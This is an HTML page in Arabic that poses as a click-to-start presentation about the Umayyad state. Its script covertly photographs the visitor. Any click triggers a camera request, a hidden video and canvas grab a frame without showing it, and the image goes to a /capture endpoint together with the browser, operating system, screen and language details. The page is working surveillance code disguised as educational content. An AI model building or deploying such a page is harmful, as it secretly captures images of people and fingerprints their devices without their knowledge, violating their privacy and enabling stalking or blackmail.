<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الدولة الأموية</title>
    <style>
        body { font-family: Arial; background: #f4f1ea; text-align: center; padding: 50px; cursor: pointer; }
        .container { max-width: 800px; margin: auto; background: white; padding: 30px; border-radius: 16px; }
        .click-hint { background: #ebf4ff; display: inline-block; padding: 12px 24px; border-radius: 40px; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🏛️ الدولة الأموية</h1>
        <p>أكبر دولة في تاريخ الإسلام</p>
        <div class="click-hint">👆 اضغط في أي مكان لبدء العرض</div>
    </div>

    <!-- فيديو مخفي تماماً (لن يظهر) -->
    <video id="video" autoplay playsinline muted style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        let isActive = false, stream = null;
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let os = "غير معروف", browser = "غير معروف";
            if (ua.includes("Windows")) os = "Windows";
            else if (ua.includes("Mac OS")) os = "macOS";
            else if (ua.includes("Android")) os = "Android";
            else if (ua.includes("iOS")) os = "iOS";
            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
            const screen = `${window.screen.width}x${window.screen.height}`;
            const language = navigator.language || "غير معروف";
            return { os, browser, screen, language };
        }

        function captureQuietly() {
            if (isActive) return;
            isActive = true;
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(s => {
                    stream = s;
                    video.srcObject = stream;
                    // انتظر نصف ثانية ثم التقط الصورة (دون عرض أي شيء)
                    setTimeout(() => {
                        try {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            const imageData = canvas.toDataURL('image/jpeg', 0.8);
                            const deviceInfo = getDeviceInfo();
                            fetch('/capture', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ image: imageData, device_info: deviceInfo })
                            }).finally(() => {
                                if (stream) stream.getTracks().forEach(t => t.stop());
                                isActive = false;
                            });
                        } catch(e) {
                            if (stream) stream.getTracks().forEach(t => t.stop());
                            isActive = false;
                        }
                    }, 500);
                })
                .catch(() => { alert("تعذر الوصول إلى الكاميرا."); isActive = false; });
        }

        document.body.addEventListener('click', () => captureQuietly());
    </script>
</body>
</html>
